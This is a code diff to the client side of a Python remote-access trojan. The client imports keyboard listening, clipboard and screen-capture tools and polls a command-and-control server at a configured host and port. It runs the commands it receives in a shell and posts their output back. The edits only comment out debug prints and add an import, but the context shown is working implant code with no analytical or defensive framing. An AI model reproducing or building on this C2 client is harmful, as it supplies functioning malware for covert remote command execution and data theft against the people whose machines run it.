@@ -17,7 +17,7 @@ from pyperclip import paste, PyperclipWindowsException
 from pynput.keyboard import Listener, Controller, Key
 from PIL import ImageGrab, Image
 from multiprocessing import Process
-
+from sys import exit
 from encryption import cipher
 # Settings Variables(Constants) Importing
 from settings import (CMD_REQUEST, CWD_RESPONSE, RESPONSE, RESPONSE_KEY, FILE_REQUEST,
@@ -110,7 +110,7 @@ if __name__ == "__main__":
         if failed, Keep Trying forever.'''
         try:
             response = get(f"http://{C2_SERVER}:{PORT}{CMD_REQUEST}{encryptedClient}", headers=HEADERS, proxies=PROXY)
-            # print(f"{Fore.LIGHTYELLOW_EX}{client.split("@")[0]}{Fore.MAGENTA} => {Fore.LIGHTBLUE_EX}{response.status_code}{Fore.RESET}")
+            # test print
             print(client.split("@")[0], "=>", response.status_code, sep=" ")
             # if we got 404 status codes, raise an exception to jump to except block
             if response.status_code == 404:
@@ -132,9 +132,11 @@ if __name__ == "__main__":
             print(f'Error Content: {e}')
             exit()
 
+        # noinspection PyUnboundLocalVariable
         # If we get a 204-Status Code from the Server, simply ReIterate the Loop with no sleep
         if response.status_code == 204:
-            print("[+] Server Command Command Executed and Result send to C2 Server.")
+            # test print
+            # print("[+] Server Command Command Executed and Result send to C2 Server.")
             continue
 
         # Retrieve the command from response and decode it
@@ -176,7 +178,8 @@ if __name__ == "__main__":
                 commandOutput = run(command, shell=True, stdout=PIPE, stderr=STDOUT).stdout
 
                 # test print
-                print("[+] OS-System command Executed on client Foreground and results send back to the C2 Server.")
+                # print("[+] OS-System command Executed on client Foreground
+                # and results send back to the C2 Server.")
 
                 # Send the output to the server, must be decoding it first because subprocess.run() return bytes
                 post_to_server(commandOutput.decode())
